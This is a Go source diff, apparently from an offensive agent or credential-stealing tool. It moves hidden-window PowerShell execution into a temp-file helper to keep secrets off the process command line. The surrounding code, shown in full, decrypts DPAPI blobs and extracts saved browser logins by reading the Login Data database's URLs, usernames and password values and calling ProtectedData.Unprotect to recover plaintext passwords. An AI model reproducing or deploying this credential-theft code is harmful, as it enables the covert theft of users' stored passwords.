@@ -52,6 +52,34 @@ func dpapiMasterKey() (string, error) {
 	return result, nil
 }
 
+// runPowerShellScript executes a PowerShell script from a throwaway temp file
+// instead of passing it (and any embedded secrets, e.g. a DPAPI blob in base64)
+// on the process command line, which would otherwise be visible to other local
+// users via process enumeration (C5). The temp file is removed immediately
+// after execution.
+func runPowerShellScript(script string) (string, error) {
+	f, err := os.CreateTemp("", "fc2-dpapi-*.ps1")
+	if err != nil {
+		return "", fmt.Errorf("create temp script: %v", err)
+	}
+	tmp := f.Name()
+	defer os.Remove(tmp)
+	if _, err := f.WriteString(script); err != nil {
+		f.Close()
+		return "", fmt.Errorf("write temp script: %v", err)
+	}
+	if err := f.Close(); err != nil {
+		return "", fmt.Errorf("close temp script: %v", err)
+	}
+	c := exec.Command("powershell", "-NoP", "-NonI", "-File", tmp)
+	applyHideWindow(c)
+	out, err := c.CombinedOutput()
+	if err != nil {
+		return "", fmt.Errorf("powershell: %v", err)
+	}
+	return string(out), nil
+}
+
 func dpapiBlob(filePath string) (string, error) {
 	if filePath == "" {
 		return "", fmt.Errorf("usage: dpapi_blob <filepath>")
@@ -62,13 +90,11 @@ func dpapiBlob(filePath string) (string, error) {
 	}
 	b64Data := base64.StdEncoding.EncodeToString(data)
 	ps := fmt.Sprintf(`[System.Reflection.Assembly]::LoadWithPartialName("System.Security"); $b=[Convert]::FromBase64String("%s"); try { $r=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); Write-Output ([Convert]::ToBase64String($r)) } catch { Write-Output "UNPROTECT_FAILED: $_" }`, b64Data)
-	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
-	applyHideWindow(c)
-	out, err := c.CombinedOutput()
+	out, err := runPowerShellScript(ps)
 	if err != nil {
-		return "", fmt.Errorf("powershell: %v", err)
+		return "", err
 	}
-	result := strings.TrimSpace(string(out))
+	result := strings.TrimSpace(out)
 	if strings.Contains(result, "UNPROTECT_FAILED") {
 		return result, fmt.Errorf("CryptUnprotectData failed (maybe wrong user context)")
 	}
@@ -99,9 +125,10 @@ func dpapiBrowser() (string, error) {
 		if ldErr == nil {
 			_ = ldInfo
 			ps := fmt.Sprintf(`$f='%s';$c=Get-Content $f -Raw;$r=@();[void][Reflection.Assembly]::LoadWithPartialName('System.Security');try{$m=Get-ItemProperty '%s\Microsoft\Protect\*\*' -Name dpapi|select -ExpandProperty dpapi}catch{}; Add-Type -AssemblyName System.Data.SQLite; try { $conn=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$f");$conn.Open();$cmd=$conn.CreateCommand();$cmd.CommandText='SELECT origin_url,username_value,password_value FROM logins';$rdr=$cmd.ExecuteReader(); while($rdr.Read()){ $o=$rdr["origin_url"];$u=$rdr["username_value"];$p=[System.Security.Cryptography.ProtectedData]::Unprotect($rdr["password_value"],$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); $r+=("$o|$u|$([Text.Encoding]::UTF8.GetString($p))") }; $conn.Close() } catch { $r+="DECRYPT_FAIL: $_" }; Write-Output ($r -join [Environment]::NewLine)`, ld, os.Getenv("APPDATA"))
-			c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
-			applyHideWindow(c)
-			out, _ := c.CombinedOutput()
+			out, perr := runPowerShellScript(ps)
+			if perr != nil {
+				out = perr.Error()
+			}
 			if len(out) > 0 {
 				found += "  Passwords:\n"
 				lines := strings.Split(string(out), "\n")
